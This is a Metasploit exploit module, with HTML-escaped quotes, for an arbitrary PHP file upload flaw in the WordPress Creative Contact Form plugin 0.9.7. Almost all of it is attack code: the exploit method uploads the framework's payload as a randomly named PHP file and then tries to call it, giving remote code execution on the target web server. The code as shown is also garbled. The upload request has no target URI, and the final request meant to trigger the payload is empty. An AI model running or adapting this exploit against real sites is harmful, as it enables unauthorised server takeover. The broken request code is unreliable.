# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary PHP code upload in the WordPress Creative Contact
        Form version 0.9.7. The vulnerability allows for arbitrary file upload and remote code execution.
      },
      &#039;Author&#039;         =>
        [
          &#039;Gianni Angelozzi&#039;, # Vulnerability discovery
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;35057&#039;],
          [&#039;OSVDB&#039;, &#039;113669&#039;],
          [&#039;WPVDB&#039;, &#039;7652&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;Creative Contact Form 0.9.7&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Oct 22 2014&#039;,
      &#039;DefaultTarget&#039;  => 0)
    )
  end

  def check
    check_plugin_version_from_readme(&#039;sexy-contact-form&#039;, &#039;1.0.0&#039;)
  end

  def exploit
    php_pagename = rand_text_alpha(8 + rand(8)) + &#039;.php&#039;

    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, &#039;application/octet-stream&#039;, nil, "form-data; name=\"files[]\"; filename=\"#{php_pagename}\"")
    post_data = data.to_s

    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;ctype&#039;     => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;      => post_data
    })

    if res
      if res.code == 200 && res.body =~ /files|#{php_pagename}/
        print_good("#{peer} - Our payload is at: #{php_pagename}. Calling payload...")
        register_files_for_cleanup(php_pagename)
      else
        fail_with(Failure::UnexpectedReply, "#{peer} - Unable to deploy payload, server returned #{res.code}")
      end
    else
      fail_with(Failure::Unknown, &#039;ERROR&#039;)
    end

    print_status("#{peer} - Calling payload...")
    send_request_cgi(
    )
  end
end

